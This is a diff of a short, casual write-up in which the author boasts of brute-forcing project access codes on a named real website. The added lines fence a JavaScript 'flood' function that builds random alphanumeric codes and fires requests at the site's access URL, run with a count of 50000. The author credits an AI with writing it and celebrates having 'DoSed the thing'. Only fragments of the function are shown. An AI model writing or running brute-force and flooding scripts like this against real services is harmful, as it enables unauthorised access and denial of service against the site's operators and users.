@@ -6,6 +6,7 @@ and obviously i had to brute force it
 
 so like... here's the code (made by ai cuz i lazy... no i just don't wanna learn javascript)
 
+```
 async function flood(y) {
     const url = "https://pycollab.com/projects/access/";
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -42,5 +43,5 @@ async function flood(y) {
 
 // Set your 'y' value here (e.g., 500)
 flood(50000); // i didn't use 500
-
+```
 then it just DoSed the thing yay success
